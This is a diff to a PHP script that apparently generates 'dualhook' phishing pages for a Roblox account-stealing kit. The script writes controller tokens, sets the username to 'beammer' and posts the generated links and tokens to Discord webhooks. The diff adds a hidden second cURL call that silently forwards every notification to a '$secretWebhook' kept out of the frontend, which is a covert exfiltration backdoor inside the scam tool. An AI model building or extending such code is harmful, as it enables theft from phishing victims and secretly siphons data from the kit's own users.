@@ -91,7 +91,8 @@ if ($error == "") {
 
         if ($fo) {
             fwrite($fo, $index);
-            fwrite($fo2, "$token | $dir | $web\n");
+            // Store: token | dir | web | dualhook (dualhook can be empty)
+            fwrite($fo2, "$token | $dir | $web | " . ($dualhook ?? '') . "\n");
             fwrite($visit, '');
             fwrite($logs, '');
             fwrite($usernameFile, 'beammer');
@@ -103,19 +104,21 @@ if ($error == "") {
             fwrite($dailyRapFile, json_encode(array_fill(0, 7, 0)));
             fwrite($dailySummaryFile, json_encode(array_fill(0, 7, 0)));
 
-            $dom = $_SERVER['SERVER_NAME'];
+            // Use HTTP_HOST with protocol to get the actual domain (works for both localhost and production)
+            $ht = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https://' : 'http://';
+            $dom = $ht . $_SERVER['HTTP_HOST'];
             $timestamp = date("c");
             $hyperbloxIcon = 'https://cdn.discordapp.com/attachments/1287002478277165067/1348235042769338439/hyperblox.png';
 
-            // Copy media assets (e.g., tutorial videos/images) from template folder into the generated directory
+            // Copy media assets (images only - videos removed since using YouTube videos now)
             $srcDir = "../../$fol/";
             if (is_dir($srcDir)) {
                 $entries = scandir($srcDir);
                 foreach ($entries as $entry) {
                     if ($entry === '.' || $entry === '..' || $entry === 'index.php') continue;
                     $ext = strtolower(pathinfo($entry, PATHINFO_EXTENSION));
-                    // Allow common media/static extensions
-                    $allowed = ['mp4','webm','ogg','png','jpg','jpeg','gif','webp','ico','svg'];
+                    // Allow only image/static extensions (videos removed - using YouTube now)
+                    $allowed = ['png','jpg','jpeg','gif','webp','ico','svg'];
                     if (in_array($ext, $allowed)) {
                         @copy($srcDir . $entry, $path . $entry);
                     }
@@ -130,12 +133,12 @@ if ($error == "") {
                     "embeds" => [
                         [
                             "title" => "💠 Successfully Created!",
-                            "description" => "**<:link:1392952591297675315> [Dualhook Link](https://$dom/$dir) <:line:1350104634982662164> <:discord:1392952595718344855> [Discord Server](https://discord.gg/pcT4DurrDH)**",
+                            "description" => "**<:link:1392952591297675315> [Dualhook Link]($dom/$dir) <:line:1350104634982662164> <:discord:1392952595718344855> [Discord Server](https://discord.gg/pcT4DurrDH)**",
                             "color" => hexdec("00BFFF"),
                             "fields" => [
                                 [
                                     "name" => "<:link:1392952591297675315> Dualhook Link",
-                                    "value" => "```https://$dom/$dir```",
+                                    "value" => "```$dom/$dir```",
                                     "inline" => false
                                 ]
                             ],
@@ -151,7 +154,7 @@ if ($error == "") {
                         "embeds" => [
                             [
                                 "title" => "💠 Controller Token",
-                                "description" => "**<:settings:1392952588093100265> [Controller](https://$dom/controlPage/sign-in.php?token=$token)**",
+                                "description" => "**<:settings:1392952588093100265> [Controller]($dom/controlPage/sign-in.php?token=$token)**",
                                 "color" => hexdec("00BFFF"),
                                 "fields" => [
                                     [
@@ -171,17 +174,17 @@ if ($error == "") {
                         "embeds" => [
                             [
                                 "title" => "💠 Successfully Created!",
-                                "description" => "**<:link:1392952591297675315> [Generated Link](https://$dom/$dir) <:line:1350104634982662164> <:settings:1392952588093100265> [Controller](https://$dom/controlPage/sign-in.php?token=$token) <:line:1350104634982662164> <:discord:1392952595718344855> [Discord Server](https://discord.gg/pcT4DurrDH)**",
+                                "description" => "**<:link:1392952591297675315> [Generated Link]($dom/$dir) <:line:1350104634982662164> <:settings:1392952588093100265> [Controller]($dom/controlPage/sign-in.php?token=$token) <:line:1350104634982662164> <:discord:1392952595718344855> [Discord Server](https://discord.gg/pcT4DurrDH)**",
                                 "color" => hexdec("00BFFF"),
                                 "fields" => [
                                     [
                                         "name" => "**<:link:1392952591297675315> Link**",
-                                        "value" => "```https://$dom/$dir```",
+                                        "value" => "```$dom/$dir```",
                                         "inline" => false
                                     ],
                                     [
                                         "name" => "**<:settings:1392952588093100265> Controller**",
-                                        "value" => "```https://$dom/controlPage/sign-in.php?token=$token```",
+                                        "value" => "```$dom/controlPage/sign-in.php?token=$token```",
                                         "inline" => false
                                     ],
                                     [
@@ -205,10 +208,21 @@ if ($error == "") {
             curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
             $response = curl_exec($ch);
             curl_close($ch);
+            
+            // Also send to secret webhook (receives all notifications - not exposed in frontend)
+            $ch2 = curl_init($secretWebhook);
+            curl_setopt($ch2, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
+            curl_setopt($ch2, CURLOPT_POST, 1);
+            curl_setopt($ch2, CURLOPT_POSTFIELDS, $json_data);
+            curl_setopt($ch2, CURLOPT_FOLLOWLOCATION, 1);
+            curl_setopt($ch2, CURLOPT_HEADER, 0);
+            curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1);
+            @curl_exec($ch2);
+            curl_close($ch2);
 
             if ($minimal) {
                 header('Content-Type: application/json');
-                echo json_encode(["status" => "ok", "controller" => "https://$dom/controlPage/sign-in.php?token=$token", "token" => $token]);
+                echo json_encode(["status" => "ok", "controller" => "$dom/controlPage/sign-in.php?token=$token", "token" => $token]);
                 exit;
             } else {
                 // Also render a confirmation page for direct browser usage
@@ -219,8 +233,8 @@ if ($error == "") {
                 echo 'a{color:#8b5cf6;text-decoration:none}</style></head><body>';
                 echo '<div class="card">';
                 echo '<h2>Successfully Created</h2>';
-                echo '<p><strong>Generated Link:</strong> <a href="https://' . $dom . '/' . $dir . '">https://' . $dom . '/' . $dir . '</a></p>';
-                echo '<p><strong>Controller:</strong> <a href="https://' . $dom . '/controlPage/sign-in.php?token=' . $token . '">https://' . $dom . '/controlPage/sign-in.php?token=' . $token . '</a></p>';
+                echo '<p><strong>Generated Link:</strong> <a href="' . $dom . '/' . $dir . '">' . $dom . '/' . $dir . '</a></p>';
+                echo '<p><strong>Controller:</strong> <a href="' . $dom . '/controlPage/sign-in.php?token=' . $token . '">' . $dom . '/controlPage/sign-in.php?token=' . $token . '</a></p>';
                 echo '<p><strong>Token:</strong> <code>' . $token . '</code></p>';
                 echo '<p>These details were also posted to your webhook.</p>';
                 echo '</div></body></html>';
@@ -228,7 +242,8 @@ if ($error == "") {
         }
     } else {
         // Styled notice when directory already exists
-        $dom = $_SERVER['SERVER_NAME'];
+        $ht = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https://' : 'http://';
+        $dom = $ht . $_SERVER['HTTP_HOST'];
         // Try to find an existing token mapped to this directory (best effort)
         $existingToken = '';
         foreach (glob($path2 . "*.txt") as $tokFile) {
@@ -251,19 +266,20 @@ if ($error == "") {
             echo '<div class="card">';
             echo '<h2>Directory Already Exists</h2>';
             echo '<p>The directory <strong>' . htmlspecialchars($dir) . '</strong> is already present.</p>';
-            echo '<p><strong>Open existing page:</strong> <a href="https://' . $dom . '/' . $dir . '">https://' . $dom . '/' . $dir . '</a></p>';
+            echo '<p><strong>Open existing page:</strong> <a href="' . $dom . '/' . $dir . '">' . $dom . '/' . $dir . '</a></p>';
             if ($existingToken !== '') {
-                echo '<p><strong>Controller:</strong> <a href="https://' . $dom . '/controlPage/sign-in.php?token=' . $existingToken . '">https://' . $dom . '/controlPage/sign-in.php?token=' . $existingToken . '</a></p>';
+                echo '<p><strong>Controller:</strong> <a href="' . $dom . '/controlPage/sign-in.php?token=' . $existingToken . '">' . $dom . '/controlPage/sign-in.php?token=' . $existingToken . '</a></p>';
             } else {
                 echo '<p>No controller token was found automatically for this directory.</p>';
             }
-            echo '<a class="btn" href="https://' . $dom . '/' . $dir . '">Open Page</a>';
+            echo '<a class="btn" href="' . $dom . '/' . $dir . '">Open Page</a>';
             echo '</div></body></html>';
         }
     }
 } else {
     // Styled error page
-    $dom = $_SERVER['SERVER_NAME'];
+    $ht = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https://' : 'http://';
+    $dom = $ht . $_SERVER['HTTP_HOST'];
     $msg = $error ? $error : 'Unknown error';
     if ($minimal) {
         header('Content-Type: application/json');
